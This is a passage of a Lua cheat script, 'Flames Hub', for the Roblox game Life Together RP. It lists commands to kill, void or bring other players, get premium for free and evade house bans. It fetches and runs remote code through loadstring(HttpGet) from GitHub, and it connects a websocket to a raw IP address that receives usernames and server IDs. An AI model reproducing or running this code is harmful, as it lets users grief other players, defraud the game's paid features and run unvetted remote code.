      {prefix}noflashinvis - Disables the flashing of the invisibility GamePass for you're character (you need to actually own the GamePass).
      {prefix}nosit - Prevents you from sitting down.
      {prefix}resit - Stops the 'nosit' command, allowing you to sit down again.
      {prefix}view [Player] - Smooth view's the target's Character.
      {prefix}unview - Disables the 'view' command.
      {prefix}void [Player] - Uses the SchoolBus Vehicle to void the target.
      {prefix}kill [Player] - Uses the SchoolBus Vehicle to kill the target.
      {prefix}bring [Player] - Uses the SchoolBus Vehicle to bring the target.
      {prefix}goto [Player] - Teleports your Character to the target player.
      {prefix}skydive [Player] - Uses the SchoolBus Vehicle to skydive the target.
      {prefix}freepay - Gives you LifePay Premium for free (no premium houses!).
      {prefix}rejoin - Makes you rejoin the current server.
      {prefix}caraccel Number - Modifies your "max_acc" on your car/vehicle.
      {prefix}carspeed Number - Modifies your "max_speed" on your car/vehicle.
      {prefix}accel Number - Modifies your "acc_0_60" on your car/vehicle (take off time/speed).
      {prefix}turnangle Number - Modifies your "turn_angle" on your car/vehicle (how fast you turn).
      {prefix}gotocar - Teleports you straight to your car/vehicle directly.
      {prefix}tpcar [Player] - Teleports your vehicle/car to the specified target.
      {prefix}antihouseban - Prevents you from being banned/kicked/teleported out of houses.
      {prefix}unantiban - Turns off 'antihouseban' command.
      {prefix}spawn CarName - Allows you to spawn any Vehicle in the game (FE).
      {prefix}prefix NewPrefixHere - Changes your prefix.
      {prefix}cmds - Displays all the available commands.
      {prefix}inject - Secret (???).
   ]]

   -- keep it like this so if you add new Commands, it'll over-write correctly.
   getgenv().cmdsString = cmdsString
   getgenv().Known_Admin_Commands = getgenv().Known_Admin_Commands or nil

   if not getgenv().Known_Admin_Commands then
      local known = {}

      for cmd in cmdsString:gmatch("{prefix}([%w_%-]+)") do
         table.insert(known, cmd:lower())
      end
      getgenv().Known_Admin_Commands = known
   end

   getgenv().getholiday = function()
      local m = tonumber(os.date("%m"))
      local d = tonumber(os.date("%d"))
      local w = tonumber(os.date("%w"))
      local y = tonumber(os.date("%Y"))
      local function wrap(t,e) return e.." "..t.." "..e end
      if m == 1 and d == 1 then return wrap("New Years","🎆") end
      if m == 1 and d == 27 then return wrap("National Chocolate Cake Day","🍰") end
      if m == 1 and d == 28 then return wrap("Data Privacy Day","💻") end
      if m == 1 and d == 31 then return wrap("National Hot Chocolate Day","🍵") end
      if m == 1 then
         local wd = tonumber(os.date("%w", os.time({year=y,month=1,day=1})))
         local off = (1 - wd + 7) % 7
         if d == 1 + off + 14 then return wrap("Martin Luther King Jr Day","✊") end
      end

      if m == 2 and d == 14 then return wrap("Valentines Day","❤️") end
      if m == 2 and d == 1 then return wrap("National Texas Day","🤠") end
      if m == 2 and d == 2 then return wrap("Groundhog Day","🦫") end
      if m == 2 and d == 4 then return wrap("National Mail Carrier Day","📬") end
      if m == 2 and d == 9 then return wrap("National Pizza Day","🍕") end

      if m == 2 then
         local wd = tonumber(os.date("%w", os.time({year=y,month=2,day=1})))
         local off = (1 - wd + 7) % 7
         if d == 1 + off + 14 then return wrap("Presidents Day","🇺🇸") end
      end
      if m == 2 then
         local wd = tonumber(os.date("%w", os.time({year=y,month=2,day=1})))
         local off = (5 - wd + 7) % 7
         if d == 1 + off then
            return wrap("Bubble Gum Day","🫧")
         end
      end
      if m == 2 then
         local wd = tonumber(os.date("%w", os.time({year=y,month=2,day=1})))
         local off = (2 - wd + 7) % 7
         if d == 1 + off + 7 then
            return wrap("Safer Internet Day","🛡️")
         end
      end

      if m == 3 and d == 1 then return wrap("National Pigs Day","🐖") end
      if m == 3 and d == 3 then return wrap("National Anthem Day","🇺🇸") end
      if m == 3 and d == 3 then return wrap("National Sons Day","👦") end
      if m == 3 and d == 4 then return wrap("National Grammar Day","✏️") end
      if m == 3 and d == 6 then return wrap("National Oreo Cookie Day","🍪") end
      if m == 3 and d == 7 then return wrap("National cereal Day","🥣") end
      if m == 3 and d == 17 then return wrap("St Patricks Day","🍀") end

      local function easterdate(year)
         local a = year % 19
         local b = math.floor(year / 100)
         local c = year % 100
         local d1 = math.floor(b / 4)
         local e = b % 4
         local f = math.floor((b + 8) / 25)
         local g = math.floor((b - f + 1) / 3)
         local h = (19 * a + b - d1 - g + 15) % 30
         local i = math.floor(c / 4)
         local k = c % 4
         local l = (32 + 2 * e + 2 * i - h - k) % 7
         local m1 = math.floor((a + 11 * h + 22 * l) / 451)
         local month = math.floor((h + l - 7 * m1 + 114) / 31)
         local day = ((h + l - 7 * m1 + 114) % 31) + 1
         return month, day
      end

      local em, ed = easterdate(y)
      if m == em and d == ed then return wrap("Easter","🐣") end

      if m == 5 then
         if tonumber(os.date("%w", os.time({year=y,month=5,day=d}))) == 0 and d > 7 and d < 15 then
            return wrap("Mothers Day","🌷")
         end
      end

      if m == 5 then
         local wd = tonumber(os.date("%w", os.time({year=y,month=5,day=31})))
         if d == 31 - wd then return wrap("Memorial Day","🪖") end
      end

      if m == 6 then
         if tonumber(os.date("%w", os.time({year=y,month=6,day=d}))) == 0 and d > 14 and d < 22 then
            return wrap("Fathers Day","🛠")
         end
      end

      if m == 7 and d == 4 then return wrap("Independence Day","🎆") end

      if m == 8 and d == 8 then return wrap("National Dollar Day","💵") end

      if m == 9 then
         local wd = tonumber(os.date("%w", os.time({year=y,month=9,day=1})))
         local off = (1 - wd + 7) % 7
         if d == 1 + off then return wrap("Labor Day","⚒") end
      end

      if m == 10 then
         local wd = tonumber(os.date("%w", os.time({year=y,month=10,day=1})))
         local off = (1 - wd + 7) % 7
         if d == 1 + off + 7 then return wrap("Columbus Day","🧭") end
      end

      if m == 10 and d == 31 then return wrap("Halloween","🎃") end

      if m == 11 and d == 11 then return wrap("Veterans Day","🎖") end

      local function thanksgivingdate(year)
         local t = os.time({year=year, month=11, day=1})
         local wd = tonumber(os.date("%w", t))
         local off = (4 - wd + 7) % 7
         return 1 + off + 21
      end

      if m == 11 and d == thanksgivingdate(y) then return wrap("Happy Thanksgiving","🦃") end

      if m == 12 and d == 25 then return wrap("Christmas","🎅") end

      if m == 11 and d == 5 then return wrap("National Donut Day","🍩") end

      if m == 6 then
         local wd = tonumber(os.date("%w", os.time({year=y,month=6,day=1})))
         local off = (5 - wd + 7) % 7
         if d == 1 + off then return wrap("National Donut Day","🍩") end
      end

      return nil
   end
   fw(0.2)
   getgenv().count_all_flames_hub_commands = function()
      local cmds = getgenv().cmdsString
      if type(cmds) ~= "string" then return 0 end

      local total = 0

      for line in cmds:gmatch("[^\r\n]+") do
         local cleaned = line:match("^%s*(.-)%s*$")
         if cleaned and cleaned ~= "" then
            if cleaned:find("{prefix}",1,true) then
               local valid = cleaned:match("{prefix}%S+")
               if valid then
                  total = total + 1
               end
            end
         end
      end

      return total
   end

   local holiday = getholiday() or ""
   local h = holiday ~= "" and (" " .. holiday) or ""

   getgenv().notify = getgenv().notify or function(notif_type, msg, duration)
      NotifyLib:External_Notification(tostring(notif_type), tostring(msg), tonumber(duration))
   end

   if not getgenv().spoofed_maximum_fps_count then
      local set_fps = setfpscap or setfps or set_fps or set_fps_cap

      if setfpscap or setfps or set_fps or set_fps_cap then
         set_fps(360)
         fw(0.2)
         notify("Success", "Successfully maximized FPS capabilities.", 5)
      end

      getgenv().spoofed_maximum_fps_count = true
   end

   -- [[ Announcement system I no longer use. ]] --
   local Announcement_Message = "The day you've all been waiting for, the day where the Anti Outfit Stealer only works on Flames Hub users, you can now all change your bio's + fixed ban system spamming 'ban system inactive' on other private servers."
   getgenv().displayTimeMax = 60
   getgenv().Script_Loaded_Correctly_LifeTogether_Admin_Flames_Hub = getgenv().Script_Loaded_Correctly_LifeTogether_Admin_Flames_Hub or false
   getgenv().Script_Version_GlobalGenv = Script_Version -- also keep it like this so it can over-write new version properly.
   local SoundService = getgenv().SoundService or cloneref(game:GetService("SoundService"))
   local RS = getgenv().ReplicatedStorage or cloneref(game:GetService("ReplicatedStorage"))

   if not getgenv().LoadedFlamesHubChatAdvisoryWarningGUI then
      loadstring(game:HttpGet('https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/refs/heads/main/TextChatServiceWarningBadMessages.lua'))()
      fw(0.1)
      getgenv().LoadedFlamesHubChatAdvisoryWarningGUI = true
   end

   --[[if not getgenv().clear_life_together_rp_annoying_display_messages then
      getgenv().clear_life_together_rp_annoying_display_messages = true
      local policy = require(RS:FindFirstChild("PolicyInfo", true))
      local success, response = pcall(function()
         policy.info = {
            AllowedExternalLinkReferences = {}
         }

         policy.is_external_link_allowed = function()
            return false
         end

         policy.is_external_link_allowed_async = function()
            return false
         end
      end)

      if success then
         getgenv().notify("Success", "Successfully stopped Life Together RPs annoying messages in the chat.", 10)
      else
         getgenv().notify("Error", "We we're not able to hook Life Together RPs display messages.", 7)
      end
   end--]]

   if not getgenv().Has_Already_Changed_Sound_IDs_And_Volume then
      getgenv().Has_Already_Changed_Sound_IDs_And_Volume = true
      for _,v in pairs(SoundService:GetChildren()) do
         if v:IsA("Sound") and v.Name:lower():find("notif") then
            v.Volume = 1
            if current_device == "Windows" then
               v.SoundId = Sound_ID_Windows
            elseif current_device == "iOS" then
               v.SoundId = Sound_ID_iPhone
            elseif current_device == "Android" then
               v.SoundId = Sound_ID_Android
            else
               v.SoundId = Sound_ID_Universal
            end
         end
      end
   end

   if not getgenv().Flames_Hub_Owner_Title_Animated_Initialized then
      getgenv().Flames_Hub_Owner_Title_Animated_Initialized = true

      local lib = getgenv().FlamesLibrary
      local target_userids = { 10483028410, 7712000520 }
      local title_name = "unique_title_billboard"
      local OWNER_KEY = "owner_title"
      getgenv().activeowner_title_billboards = getgenv().activeowner_title_billboards or {}
      local function animate_label(label)
         local key = OWNER_KEY .. "_label_" .. tostring(label)
         local colors = {
            Color3.fromRGB(255, 0, 0),
            Color3.fromRGB(255, 140, 0),
            Color3.fromRGB(255, 255, 0),
            Color3.fromRGB(0, 255, 0),
            Color3.fromRGB(0, 170, 255),
            Color3.fromRGB(140, 0, 255),
         }

         lib.spawn(key, "spawn", function()
            local index = 1
            while label and label.Parent do
               local tween = TweenService:Create(
                  label,
                  TweenInfo.new(0.4, Enum.EasingStyle.Linear),
                  { TextColor3 = colors[index] }
               )
               tween:Play()
               tween.Completed:Wait()
               index = (index % #colors) + 1
            end
            lib.disconnect(key)
         end)
      end

      local function animate_float(billboard)
         local key = OWNER_KEY .. "_float_" .. tostring(billboard)
         local going_up = true

         lib.spawn(key, "spawn", function()
            while billboard and billboard.Parent do
               local goal = going_up
                  and { StudsOffset = Vector3.new(0, 3, 0) }
                  or  { StudsOffset = Vector3.new(0, 2.5, 0) }

               local tween = TweenService:Create(
                  billboard,
                  TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
                  goal
               )
               tween:Play()
               tween.Completed:Wait()
               going_up = not going_up
            end
            lib.disconnect(key)
         end)
      end

      local function create_billboard(character)
         if not character then return end
         local head = character:FindFirstChild("Head") or character:WaitForChild("Head", 10)
         if not head or head:FindFirstChild(title_name) then return end

         local billboard = Instance.new("BillboardGui")
         billboard.Name = title_name
         billboard.Size = UDim2.new(0, 220, 0, 60)
         billboard.StudsOffset = Vector3.new(0, 2.5, 0)
         billboard.AlwaysOnTop = true
         billboard.Parent = head

         local frame = Instance.new("Frame")
         frame.Size = UDim2.new(1, 0, 1, 0)
         frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
         frame.BackgroundTransparency = 0.2
         frame.BorderSizePixel = 0
         frame.Parent = billboard

         local corner = Instance.new("UICorner")
         corner.CornerRadius = UDim.new(0, 12)
         corner.Parent = frame

         local stroke = Instance.new("UIStroke")
         stroke.Thickness = 2
         stroke.Color = Color3.fromRGB(255, 140, 0)
         stroke.Parent = frame

         local label = Instance.new("TextLabel")
         label.BackgroundTransparency = 1
         label.Size = UDim2.new(1, -10, 1, -10)
         label.Position = UDim2.new(0, 5, 0, 5)
         label.Text = "🕷️ | FLAMES HUB | OWNER | 🔥"
         label.Font = Enum.Font.GothamBlack
         label.TextScaled = true
         label.TextStrokeTransparency = 0
         label.TextColor3 = Color3.new(1, 1, 1)
         label.Parent = frame

         animate_label(label)
         animate_float(billboard)

         getgenv().activeowner_title_billboards[character] = billboard
      end

      local function cleanup_character(character)
         local billboard = getgenv().activeowner_title_billboards[character]
         if billboard then
            lib.disconnect(OWNER_KEY .. "_float_" .. tostring(billboard))
            local label = billboard:FindFirstChildWhichIsA("TextLabel", true)
            if label then
               lib.disconnect(OWNER_KEY .. "_label_" .. tostring(label))
            end
            pcall(function() billboard:Destroy() end)
            getgenv().activeowner_title_billboards[character] = nil
         end
      end

      local function watch_character(player)
         local found = false
         for _, id in ipairs(target_userids) do
            if player.UserId == id then found = true break end
         end
         if not found then return end
         local char_key = OWNER_KEY .. "_charadded_" .. tostring(player.UserId)

         lib.connect(char_key,
            player.CharacterAdded:Connect(function(char)
               cleanup_character(char) -- clear any stale billboard from last spawn
               lib.spawn(char_key .. "_spawn", "spawn", function()
                  create_billboard(char)
               end)
            end)
         )

         if player.Character then
            lib.spawn(char_key .. "_spawn", "spawn", function()
               create_billboard(player.Character)
            end)
         end
      end

      local function unwatch_player(player)
         local found = false
         for _, id in ipairs(target_userids) do
            if player.UserId == id then found = true break end
         end
         if not found then return end

         local char_key = OWNER_KEY .. "_charadded_" .. tostring(player.UserId)
         lib.disconnect(char_key)
         lib.disconnect(char_key .. "_spawn")

         if player.Character then
            cleanup_character(player.Character)
         end
      end

      for _, plr in ipairs(Players:GetPlayers()) do
         watch_character(plr)
      end

      if not getgenv().Flames_Title_Owner_Added_And_Removing_Checks then
         getgenv().Flames_Title_Owner_Added_And_Removing_Checks = true

         lib.connect(OWNER_KEY .. "_player_added",
            Players.PlayerAdded:Connect(function(plr)
               lib.spawn(OWNER_KEY .. "_watch_" .. tostring(plr.UserId), "spawn", function()
                  watch_character(plr)
               end)
            end)
         )

         lib.connect(OWNER_KEY .. "_player_removing",
            Players.PlayerRemoving:Connect(function(plr)
               unwatch_player(plr)
            end)
         )
      end
   end

   if not getgenv().Loaded_Actual_Chat_Actors_Global_Setter then
      loadstring(game:HttpGet('https://raw.githubusercontent.com/EnterpriseExperience/FlamesHub_OldAPI_Runtime_Functions/refs/heads/main/chat_handler_exclusive.lua'))()
      getgenv().Loaded_Actual_Chat_Actors_Global_Setter = true
   end

   getgenv().roles_for_chat_system = {
      ["CIippedByAura"] = "owner",
      ["AmazingAura2"] = "owner",
      ["Amazing4urA"] = "owner",
      ["AuraWithClipFarmin"] = "owner",
      ["CleanestAuraEv3r"] = "owner",
      ["imjustbeter100"] = "staff",
      ["L0CKED_1N1"] = "owner",
      ["imbetter100062"] = "staff",
      ["jdot7580"] = "staff",
      ["ddosama136703"] = "staff",
   }

   local HttpService   = game:GetService("HttpService")
   local UserInputService = game:GetService("UserInputService")
   local TweenService  = game:GetService("TweenService")
   local reconnect_delay = 3
   getgenv().ws_conn          = getgenv().ws_conn          or nil
   getgenv().chat_ui          = getgenv().chat_ui          or nil
   getgenv().chat_visible     = getgenv().chat_visible     or false
   getgenv().chat_connected   = getgenv().chat_connected   or false
   getgenv().chat_reconnecting= getgenv().chat_reconnecting or false
   getgenv().typing_labels    = getgenv().typing_labels    or {}
   getgenv().chat_tabs        = getgenv().chat_tabs        or {}
   getgenv().active_tab       = getgenv().active_tab       or "Global"
   getgenv().chat_scroll      = getgenv().chat_scroll      or nil
   getgenv().ws_close_conn    = getgenv().ws_close_conn    or nil
   getgenv().ws_message_conn  = getgenv().ws_message_conn  or nil
   getgenv().seen_users       = getgenv().seen_users       or {}

   local function cleanup_socket()
      getgenv().chat_connected = false
      
      if getgenv().ws_message_conn then
         pcall(function() getgenv().ws_message_conn:Disconnect() end)
         getgenv().ws_message_conn = nil
      end
      if getgenv().ws_close_conn then
         pcall(function() getgenv().ws_close_conn:Disconnect() end)
         getgenv().ws_close_conn = nil
      end
      if getgenv().ws_conn then
         local old_ws = getgenv().ws_conn
         getgenv().ws_conn = nil
         pcall(function() old_ws:Close() end)
      end
   end

   local function switch_tab(name)
      for tab, frame in pairs(getgenv().chat_tabs) do
         frame.Visible = (tab == name)
      end
      getgenv().active_tab = name
   end

   local function create_tab(name)
      if getgenv().chat_tabs[name] then return end
      if not getgenv().chat_scroll then return end

      local container = Instance.new("ScrollingFrame")
      container.CanvasSize          = UDim2.new(0, 0, 0, 0)
      container.AutomaticCanvasSize = Enum.AutomaticSize.Y
      container.ScrollBarThickness  = 4
      container.ScrollingDirection  = Enum.ScrollingDirection.Y
      container.Size                = UDim2.new(1, 0, 1, 0)
      container.Position            = UDim2.new(0, 0, 0, 0)
      container.BackgroundColor3    = Color3.fromRGB(20, 20, 20)
      container.BackgroundTransparency = 0
      container.Visible             = false
      container.Parent              = getgenv().chat_scroll
      container.ScrollBarImageColor3 = Color3.fromRGB(80, 80, 80)

      Instance.new("UICorner", container).CornerRadius = UDim.new(0, 8)

      local padding = Instance.new("UIPadding", container)
      padding.PaddingTop    = UDim.new(0, 6)
      padding.PaddingBottom = UDim.new(0, 6)
      padding.PaddingLeft   = UDim.new(0, 6)
      padding.PaddingRight  = UDim.new(0, 6)

      local layout = Instance.new("UIListLayout", container)
      layout.Padding   = UDim.new(0, 6)
      layout.SortOrder = Enum.SortOrder.LayoutOrder

      getgenv().chat_tabs[name] = container
   end

   getgenv().handle_typing = function(user, state)
      local tab = getgenv().chat_tabs["Global"]
      if not tab then return end
      local dot_map = { ".", "..", "..." }
      local lib = getgenv().FlamesLibrary
      local key = "typing_anim_" .. tostring(user)

      if state then
         if getgenv().typing_labels[user] then return end

         local label = Instance.new("TextLabel")
         label.Size = UDim2.new(1, 0, 0, 18)
         label.BackgroundTransparency = 1
         label.TextColor3 = Color3.fromRGB(150, 150, 150)
         label.Font = 12
         label.TextSize = 12
         label.TextXAlignment = 0
         label.Parent = tab

         lib.spawn(key, "spawn", function()
            local dots = 0
            while label.Parent do
               dots = (dots % 3) + 1
               label.Text = user .. " is typing" .. dot_map[dots]
               task.wait(0.4)
            end
            lib.disconnect(key)
         end)

         getgenv().typing_labels[user] = label
      else
         local lbl = getgenv().typing_labels[user]
         if lbl then
            lib.disconnect(key)
            lbl:Destroy()
            getgenv().typing_labels[user] = nil
         end
      end
   end

   getgenv().add_message = function(user, text, tab, system)
      local tabs = getgenv().chat_tabs
      if not tabs then return end

      tab    = tab    or getgenv().active_tab or "Global"
      system = system or false
      user   = user   or "Unknown"
      text   = text   or ""

      local parent = tabs[tab]
      if not parent then return end

      local role = getgenv().roles_for_chat_system and getgenv().roles_for_chat_system[user]

      local holder = Instance.new("Frame")
      holder.Size              = UDim2.new(1, 0, 0, 0)
      holder.AutomaticSize     = Enum.AutomaticSize.Y
      holder.BackgroundTransparency = 1

      local bubble = Instance.new("Frame", holder)
      bubble.AutomaticSize  = Enum.AutomaticSize.Y
      bubble.Size           = UDim2.new(1, 0, 0, 0)
      bubble.BackgroundColor3 = system and Color3.fromRGB(40, 30, 0) or Color3.fromRGB(28, 28, 28)
      Instance.new("UICorner", bubble).CornerRadius = UDim.new(0, 8)

      local pad = Instance.new("UIPadding", bubble)
      pad.PaddingTop    = UDim.new(0, 6)
      pad.PaddingBottom = UDim.new(0, 6)
      pad.PaddingLeft   = UDim.new(0, 8)
      pad.PaddingRight  = UDim.new(0, 8)

      local label = Instance.new("TextLabel", bubble)
      label.BackgroundTransparency = 1
      label.Size           = UDim2.new(1, 0, 0, 0)
      label.AutomaticSize  = Enum.AutomaticSize.Y
      label.TextWrapped    = true
      label.TextXAlignment = Enum.TextXAlignment.Left
      label.Font           = Enum.Font.Gotham
      label.TextSize       = 13

      local t = string.format("%02d:%02d", os.date("*t").hour, os.date("*t").min)

      if system then
         label.Text       = "[" .. t .. "] " .. text
         label.TextColor3 = Color3.fromRGB(80, 140, 255)
      elseif role == "owner" then
         label.Text       = "[" .. t .. "] [😉🤫OWNER👑😈] [" .. user .. "]: " .. text
         label.TextColor3 = Color3.fromRGB(35, 71, 139)
      elseif role == "staff" then
         label.Text       = "[" .. t .. "] [⚔️STAFF⚔️] [" .. user .. "]: " .. text
         label.TextColor3 = Color3.fromRGB(60, 220, 60)
      else
         label.Text       = "[" .. t .. "] [" .. user .. "]: " .. text
         label.TextColor3 = Color3.fromRGB(255, 255, 255)
      end

      holder.Parent = parent

      bubble.BackgroundTransparency = 1
      label.TextTransparency        = 1
      TweenService:Create(bubble, TweenInfo.new(0.15), { BackgroundTransparency = 0 }):Play()
      TweenService:Create(label,  TweenInfo.new(0.15), { TextTransparency = 0 }):Play()

      task.defer(function()
         wait()
         local canvas = parent
         if not canvas:IsA("ScrollingFrame") then return end
         local maxY = canvas.AbsoluteCanvasSize.Y - canvas.AbsoluteSize.Y
         if maxY <= 0 then return end
         if (maxY - canvas.CanvasPosition.Y) < 80 then
            TweenService:Create(
               canvas,
               TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
               { CanvasPosition = Vector2.new(0, maxY) }
            ):Play()
         end
      end)
   end

   getgenv().add_msg = function(user, text, tab, system)
      tab    = tab    or getgenv().active_tab or "Global"
      system = (system or user == "SYSTEM") and true or false
      local tabs = getgenv().chat_tabs
      if not tabs or not tabs[tab] then return end
      add_message(user, text, tab, system)
   end

   getgenv().connect_chat = function()
      if getgenv().chat_connected or (getgenv().ws_conn ~= nil and not getgenv().chat_reconnecting) then 
         return 
      end

      local connector = (syn and syn.websocket and syn.websocket.connect)
         or (WebSocket and WebSocket.connect)
         or (websocket and websocket.connect)

      if not connector then
         return warn("[Flames Hub]: No WebSocket support")
      end

      cleanup_socket()

      local success, ws = pcall(connector, "ws://50.116.35.248:8080")
      if not success or not ws then
         if not getgenv().chat_reconnecting then getgenv().start_reconnect() end
         return
      end

      getgenv().ws_conn = ws
      getgenv().connection_confirmed = false

      task.delay(7, function()
         if not getgenv().connection_confirmed and getgenv().ws_conn == ws then
            warn("[Flames Hub]: Connection timeout, retrying...")
            getgenv().start_reconnect()
         end
      end)

      getgenv().ws_message_conn = ws.OnMessage:Connect(function(msg)
         if not getgenv().connection_confirmed then
            getgenv().connection_confirmed = true
            getgenv().chat_connected = true
            getgenv().chat_reconnecting = false
         end

         local ok, data = pcall(HttpService.JSONDecode, HttpService, msg)
         if not ok or type(data) ~= "table" then return end

         if data.system then
            getgenv().add_msg("SYSTEM", tostring(data.text), "Global", true)
         elseif data.type == "pm" then
            local from = tostring(data.from or "?")
            if not getgenv().chat_tabs[from] then
               create_tab(from)
               if getgenv().create_tab_button then getgenv().create_tab_button(from) end
            end
            getgenv().add_msg(from, tostring(data.text or ""), from)
         elseif data.type == "typing" then
            getgenv().handle_typing(tostring(data.user or ""), data.state)
         elseif type(data.user) == "string" and type(data.text) == "string" then
            getgenv().add_msg(data.user, data.text, "Global")
         end
      end)

      if ws.OnClose then
         getgenv().ws_close_conn = ws.OnClose:Connect(function()
            if getgenv().ws_conn == ws then
               getgenv().chat_connected = false
               getgenv().start_reconnect()
            end
         end)
      end

      pcall(function()
         local username = game.Players.LocalPlayer.Name
         local joinType = getgenv().seen_users[username] and "rejoin" or "join"
         getgenv().seen_users[username] = true

         ws:Send(HttpService:JSONEncode({
            type   = joinType,
            server = game.JobId,
            user   = username
         }))
      end)
   end

   getgenv().start_reconnect = function()
      if getgenv().chat_reconnecting then return end
      getgenv().chat_reconnecting = true
      cleanup_socket()
      getgenv().add_msg("SYSTEM", "Connection lost. Re-establishing link...", "Global", true)

      task.spawn(function()
         while getgenv().chat_reconnecting and not getgenv().chat_connected do
            wait(reconnect_delay)
            if getgenv().chat_connected then break end
            
            pcall(getgenv().connect_chat)
         end
         getgenv().chat_reconnecting = false
      end)
   end

   getgenv().disconnect_chat = function()
      getgenv().chat_reconnecting = false
      if not getgenv().chat_connected then return end

      local ws = getgenv().ws_conn
      if ws then
         pcall(function()
            ws:Send(HttpService:JSONEncode({
               type = "leave",
               server = game.JobId,
               user = game.Players.LocalPlayer.Name
            }))
            ws:Close()
         end)
      end
      getgenv().chat_connected = false
      getgenv().ws_conn = nil
   end

   getgenv().create_chat_ui = function()
      if getgenv().chat_ui then return getgenv().chat_ui end

      local isMobile = UserInputService.TouchEnabled
      local FRAME_SIZE = isMobile and UDim2.new(0, 300, 0, 225) or UDim2.new(0, 380, 0, 300)
      local gui = Instance.new("ScreenGui")
      gui.Name = "ws_chat"
      gui.ResetOnSpawn = false
      gui.Parent = getgenv().PlayerGui or LocalPlayer:WaitForChild("PlayerGui")

      local frame = Instance.new("Frame", gui)
      frame.Size             = FRAME_SIZE
      frame.Position         = UDim2.new(0.3, 0, 0.3, 0)
      frame.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
      frame.Active           = true
      frame.Draggable        = true
      Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

      local tabbar = Instance.new("Frame", frame)
      tabbar.Size             = UDim2.new(1, -70, 0, 28)
      tabbar.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
      Instance.new("UICorner", tabbar).CornerRadius = UDim.new(0, 10)

      local tabs_layout = Instance.new("UIListLayout", tabbar)
      tabs_layout.FillDirection       = Enum.FillDirection.Horizontal
      tabs_layout.HorizontalAlignment = Enum.HorizontalAlignment.Left
      tabs_layout.SortOrder           = Enum.SortOrder.LayoutOrder

      local controls = Instance.new("Frame", frame)
      controls.Size             = UDim2.new(0, 62, 0, 26)
      controls.Position         = UDim2.new(1, -65, 0, 2)
      controls.BackgroundTransparency = 1
      controls.ZIndex           = 10

      local min_btn = Instance.new("TextButton", controls)
      min_btn.Size             = UDim2.new(0, 28, 1, 0)
      min_btn.Text             = "-"
      min_btn.TextSize         = 16
      min_btn.Font             = Enum.Font.GothamBold
      min_btn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
      min_btn.TextColor3       = Color3.fromRGB(200, 200, 200)
      min_btn.ZIndex           = 11
      Instance.new("UICorner", min_btn).CornerRadius = UDim.new(0, 6)

      local close_btn = Instance.new("TextButton", controls)
      close_btn.Size             = UDim2.new(0, 28, 1, 0)
      close_btn.Position         = UDim2.new(0, 32, 0, 0)
      close_btn.Text             = "X"
      close_btn.TextSize         = 16
      close_btn.Font             = Enum.Font.GothamBold
      close_btn.BackgroundColor3 = Color3.fromRGB(170, 40, 40)
      close_btn.TextColor3       = Color3.fromRGB(220, 220, 220)
      close_btn.ZIndex           = 11
      Instance.new("UICorner", close_btn).CornerRadius = UDim.new(0, 6)

      local scroll = Instance.new("Frame", frame)
      scroll.Size              = UDim2.new(1, -10, 1, -70)
      scroll.Position          = UDim2.new(0, 5, 0, 32)
      scroll.BackgroundTransparency = 1
      scroll.ClipsDescendants  = true
      getgenv().chat_scroll = scroll

      local box = Instance.new("TextBox", frame)
      box.Size             = UDim2.new(1, -10, 0, 32)
      box.Position         = UDim2.new(0, 5, 1, -35)
      box.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
      box.TextColor3       = Color3.fromRGB(255, 255, 255)
      box.PlaceholderText  = "Message or /w Player msg..."
      box.Text             = ""
      box.ClearTextOnFocus = true
      box.Font             = Enum.Font.Gotham
      box.TextSize         = 13
      box.TextXAlignment   = Enum.TextXAlignment.Left
      Instance.new("UICorner", box).CornerRadius = UDim.new(0, 8)
      local bp = Instance.new("UIPadding", box)
      bp.PaddingLeft = UDim.new(0, 8)

      local typing_active = false
      local last_type_tick = 0

      box:GetPropertyChangedSignal("Text"):Connect(function()
         local ws = getgenv().ws_conn
         if not ws then return end

         last_type_tick = tick()

         if not typing_active then
            typing_active = true
            pcall(function()
               ws:Send(HttpService:JSONEncode({
                  type   = "typing",
                  server = game.JobId,
                  user   = game.Players.LocalPlayer.Name,
                  state  = true
               }))
            end)
         end

         task.delay(1.5, function()
            if tick() - last_type_tick >= 1.4 and typing_active then
               typing_active = false
               local ws2 = getgenv().ws_conn
               if ws2 then
                  pcall(function()
                     ws2:Send(HttpService:JSONEncode({
                        type   = "typing",
                        server = game.JobId,
                        user   = game.Players.LocalPlayer.Name,
                        state  = false
                     }))
                  end)
               end
            end
         end)
      end)

      getgenv().create_tab_button = function(name)
         for _, child in ipairs(tabbar:GetChildren()) do
            if child:IsA("TextButton") and child.Text == name then return end
         end

         local btn = Instance.new("TextButton", tabbar)
         btn.Size             = UDim2.new(0, 72, 1, 0)
         btn.Text             = name
         btn.BackgroundTransparency = 1
         btn.TextColor3       = Color3.fromRGB(200, 200, 200)
         btn.Font             = Enum.Font.Gotham
         btn.TextSize         = 12
         btn.LayoutOrder      = 1

         btn.MouseButton1Click:Connect(function()
            switch_tab(name)
         end)
      end

      local minimized = false
      min_btn.MouseButton1Click:Connect(function()
         minimized = not minimized
         scroll.Visible   = not minimized
         box.Visible      = not minimized
         tabbar.Visible   = not minimized
         frame.Size       = minimized and UDim2.new(0, 380, 0, 32) or FRAME_SIZE
         min_btn.Text     = minimized and "+" or "-"
      end)

      close_btn.MouseButton1Click:Connect(function()
         gui.Enabled = false
      end)

      create_tab("Global")
      create_tab_button("Global")
      switch_tab("Global")

      local function handle_command(text)
         local args = text:split(" ")
         local cmd  = args[1]:lower()

         if cmd == "/clear" then
            local tab = getgenv().chat_tabs[getgenv().active_tab]
            if tab then
               for _, v in ipairs(tab:GetChildren()) do
                  if v:IsA("Frame") then v:Destroy() end
               end
            end
            return true
         end

         if cmd == "/pm" or cmd == "/w" then
            local target = args[2]
            if not target then return true end
            local plr = nil
            for _, p in ipairs(game.Players:GetPlayers()) do
               if p.Name:lower():sub(1, #target) == target:lower() then
                  plr = p
                  break
               end
            end
            if not plr then
               getgenv().add_msg("SYSTEM", "Player not found: " .. target, "Global", true)
               return true
            end

            local msg = table.concat(args, " ", 3)
            if msg == "" then return true end

            local name = plr.Name
            if not getgenv().chat_tabs[name] then
               create_tab(name)
               create_tab_button(name)
            end

